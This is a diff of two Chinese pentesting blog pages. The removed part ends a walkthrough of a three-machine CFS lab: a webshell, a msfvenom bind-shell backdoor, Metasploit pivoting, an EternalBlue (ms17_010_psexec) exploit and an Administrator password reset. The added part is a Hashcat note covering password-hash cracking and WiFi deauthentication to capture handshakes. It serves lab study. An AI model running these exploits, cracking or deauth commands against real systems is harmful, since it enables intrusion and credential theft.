-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>8、找到我们想要的了，登陆后台，看看有哪些功能<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h2 id="b、设置代理-1"><a href="#b、设置代理-1" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><p>1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门</p>
-<pre><code class="bash">root@kali:~# msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf &gt; shell2.elf</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、利用蚁剑将shell2.elf上传到Target2并开启监听</p>
-<pre><code class="bash">(www:/www/wwwroot/upload) $ chmod 777 shell2.elf
-(www:/www/wwwroot/upload) $ ./shell2.elf</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p>3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p>
-<pre><code class="bash">msf5 &gt; use exploit/multi/handler
-msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp
-msf5 exploit(multi/handler) &gt; set RHOST 192.168.22.22
-msf5 exploit(multi/handler) &gt; set LPORT 4321
-msf5 exploit(multi/handler) &gt; options
-msf5 exploit(multi/handler) &gt; run</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p>
-<pre><code class="bash">run autoroute -s 192.168.33.0/24
-run autoroute -p</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、尝试扫描Target3</p>
-<pre><code class="bash">root@kali:~# proxychains4 nmap -Pn -sT 192.168.33.33</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><h2 id="a、获取shell-2"><a href="#a、获取shell-2" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试</p>
-<pre><code class="bash">msf5 &gt; use exploit/windows/smb/ms17_010_psexec
-msf5 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/bind_tcp
-msf5 exploit(windows/smb/ms17_010_psexec) &gt; set RHOST 192.168.33.33
-msf5 exploit(windows/smb/ms17_010_psexec) &gt; options
-msf5 exploit(windows/smb/ms17_010_psexec) &gt; run</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p>2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序</p>
-<pre><code class="bash">meterpreter &gt; shell
-C:\Windows\system32&gt;net user
-C:\Windows\system32&gt;net user Administrator 123</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。<br>这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：</p>
-<p>1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看<br>2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的<br>3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功<br>4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可<br>5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功<br>6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的<br>7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌</p>
+<h3 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p>
+<pre><code>hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew/xd0O0hPG/yrm2X.&#39; ?l?l?l?l</code></pre>
 <blockquote>
-<p>参考文章：<br><a target="_blank" rel="noopener" href="http://zerlong.com/512.html">http://zerlong.com/512.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170649">https://www.anquanke.com/post/id/170649</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36711453/article/details/84977739">https://blog.csdn.net/qq_36711453/article/details/84977739</a><br>这些文章在很大程度上帮助了我这个菜鸟，在这里向以上文章的作者表示感谢。</p>
+<p>可通过 cat /etc/shadow 获取哈希值</p>
 </blockquote>
+<p>或者不删除用户名，直接使用 –username 参数</p>
+<pre><code>hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz/xBob0kF1Lp170Cgg0i5Tslf3JW/sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username</code></pre>
+<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>NT Hash</p>
+<pre><code>hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</code></pre>
+<p>LM Hash</p>
+<pre><code>hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</code></pre>
+<p>NetNTLM Hash</p>
+<pre><code>hashcat -a 3 -m 5500 teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force</code></pre>
+<h3 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h3><pre><code>hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</code></pre>
+<h3 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h3><pre><code>hashcat -a 3 -m 400 --force &#39;$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/&#39; ?d?d?d?d?d?d</code></pre>
 <blockquote>
-<p>本文首发地址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187908">https://www.anquanke.com/post/id/187908</a></p>
+<p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p>
+</blockquote>
+<h3 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h3><pre><code>hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</code></pre>
+<blockquote>
+<p>其密码加密方式 md5(md5($pass).$salt)</p>
+</blockquote>
+<h3 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h3><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来。</p>
+<p>rar2john 下载地址：<a target="_blank" rel="noopener" href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p>
+<pre><code># 获取 rar 文件 hash
+rar2john.exe 1.rar</code></pre>
+<p>hashcat 支持 RAR3-hp 和 RAR5</p>
+<p>对于 RAR5，示例如下：</p>
+<pre><code>hashcat -a 3 -m 13000 --force &#39;$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4&#39; ?d?d?d?d?d?d</code></pre>
+<p>对于 RAR3-hp</p>
+<pre><code>hashcat -a 3 -m 12500 --force &#39;$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb&#39; ?d?d?d?d</code></pre>
+<blockquote>
+<p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp</p>
+<p>关于 RAR 参数 -p 和 -hp 的区别：<br>-p：只对 RAR 文件加密，里面的目录和文件名没加密；<br>-hp：对目录中的文件名和子目录都进行加密处理</p>
+</blockquote>
+<h3 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h3><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下。</p>
+<pre><code># 获取 zip 文件 hash
+zip2john.exe 1.zip</code></pre>
+<pre><code>hashcat -a 3 -m 13600 &#39;$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$/zip2$&#39; --force ?d?d?d?d?d?d</code></pre>
+<blockquote>
+<p>这里 ZIP 的加密算法使用的 AES256</p>
+</blockquote>
+<h3 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h3><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下。</p>
+<pre><code># 获取 office 文件 hash
+python office2john.py 1.docx</code></pre>
+<blockquote>
+<p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p>
+</blockquote>
+<pre><code>hashcat -a 3 -m 9600 &#39;$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d&#39; --force ?d?d?d?d?d?d</code></pre>
+<blockquote>
+<p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式。</p>
+</blockquote>
+<h3 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h3><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了。</p>
+<p><strong>抓取 WIFI 握手包</strong></p>
+<p>1、将网卡处于监听状态</p>
+<pre><code>airmon-ng check 
+airmon-ng check kill // 关闭影响监听状态的进程
+airmon-ng start wlan0</code></pre>
+<blockquote>
+<p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p>
+</blockquote>
+<p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p>
+<p>2、扫描可用 WIFI</p>
+<pre><code>airodump-ng wlan0mon</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831104636.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>3、获取wifi的握手包</p>
+<pre><code>airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon</code></pre>
+<p>这里以 ssid 为 teamssix 的 WIFI 为例</p>
+<pre><code>airodump-ng -c 1 --bssid 5E:C1:1B:A2:37:F1 -w ./ wlan0mon</code></pre>
+<p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p>
+<pre><code>aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831105351.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p>
+<pre><code>aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon</code></pre>
+<p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831132010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>4、破解密码</p>
+<p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p>
+<pre><code>aircrack-ng 1.cap -j 1</code></pre>
+<pre><code>hashcat -a 3 -m 2500 1.hccapx ?d?d?d?d?d?d?d?d --force</code></pre>
+<p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p>
+<pre><code>hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul>
+<li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p>
+</li>
+<li><p>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可。</p>
+</li>
+<li><p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p>
+</li>
+<li><p>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</p>
+</li>
+<li><p>Hashcat 参数优化：</p>
+</li>
+</ul>
+<pre><code>--gpu-accel 160            可以让GPU发挥最大性能
+--gpu-loops 1024        可以让GPU发挥最大性能
+--segment-size 512    可以提高大字典破解的速度</code></pre>
+<blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p>
+<p><a target="_blank" rel="noopener" href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a></p>
+<p><a target="_blank" rel="noopener" href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p>
+<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
 
@@ -606,7 +690,7 @@ C:\Windows\system32&gt;net user Administrator 123</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/191021-211425.html">https://www.teamssix.com/191021-211425.html</a>
+                    <a href="https://www.teamssix.com/210831-122611.html">https://www.teamssix.com/210831-122611.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -644,16 +728,16 @@ C:\Windows\system32&gt;net user Administrator 123</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">内网渗透</span>
+                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
-                                <a href="/tags/CFS/">
-                                    <span class="chip bg-color">CFS</span>
+                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                    <span class="chip bg-color">红队</span>
                                 </a>
                             
-                                <a href="/tags/%E6%AF%94%E8%B5%9B/">
-                                    <span class="chip bg-color">比赛</span>
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
                                 </a>
                             
                         </div>
@@ -699,7 +783,7 @@ C:\Windows\system32&gt;net user Administrator 123</code></pre>
         owner: 'teamssix',
         proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token',
         admin: "teamssix",
-        id: '2019-10-21T21-14-25',
+        id: '2021-08-31T12-26-11',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -723,57 +807,56 @@ C:\Windows\system32&gt;net user Administrator 123</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/191021-213828.html">
+                <a href="/210831-122611.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag13.png" class="responsive-img" alt="【续】CFS三层靶机中的Flag位置及其获取">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png" class="responsive-img" alt="【内网学习笔记】20、Hashcat 的使用">
                         
-                        <span class="card-title">【续】CFS三层靶机中的Flag位置及其获取</span>
+                        <span class="card-title">【内网学习笔记】20、Hashcat 的使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 前言最近写了一篇《CFS三层靶机搭建及其内网渗透》的文章，里面满满的干货，本篇文章需要结合《CFS三层靶机搭建及其内网渗透》一起看，这篇文章可以在本文底部找到阅读链接。
-
-0x01 Target11、系统根目录下
-
-2、网站根目录
+                            1、介绍Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。
+工具地址：https://hashcat.n
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-10-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/" class="post-category">
-                                    实例演示
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">内网渗透</span>
+                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/CFS/">
-                        <span class="chip bg-color">CFS</span>
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                        <span class="chip bg-color">红队</span>
                     </a>
                     
-                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
-                        <span class="chip bg-color">比赛</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
@@ -787,24 +870,24 @@ C:\Windows\system32&gt;net user Administrator 123</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/191014-090745.html">
+                <a href="/210813-153545.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi3.png" class="responsive-img" alt="经过一场面试，我发现我还存在这些不足">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813150936.png" class="responsive-img" alt="反制 Goby RCE 复现及 Mac 用户防御策略">
                         
-                        <span class="card-title">经过一场面试，我发现我还存在这些不足</span>
+                        <span class="card-title">反制 Goby RCE 复现及 Mac 用户防御策略</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 前言最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。
-这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西
+                            0x00 前言最近看到网上反制 Goby 的文章，而自己平时 Mac 一直是裸奔的状态，这下整的自己有点慌了，这里就来记录下反制 Goby RCE 的复现以及 Mac 用户的防御策略。
+0x01 反制 Goby RCE 复现XSS为了方便，
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-13
                             </span>
                         <span class="publish-author">
                             
@@ -821,12 +904,16 @@ C:\Windows\system32&gt;net user Administrator 123</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%80%BB%E7%BB%93/">
-                        <span class="chip bg-color">总结</span>
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
                     </a>
                     
-                    <a href="/tags/%E9%9D%A2%E8%AF%95/">
-                        <span class="chip bg-color">面试</span>
+                    <a href="/tags/%E9%98%B2%E5%BE%A1/">
+                        <span class="chip bg-color">防御</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%88%B6/">
+                        <span class="chip bg-color">反制</span>
                     </a>
                     
                 </div>
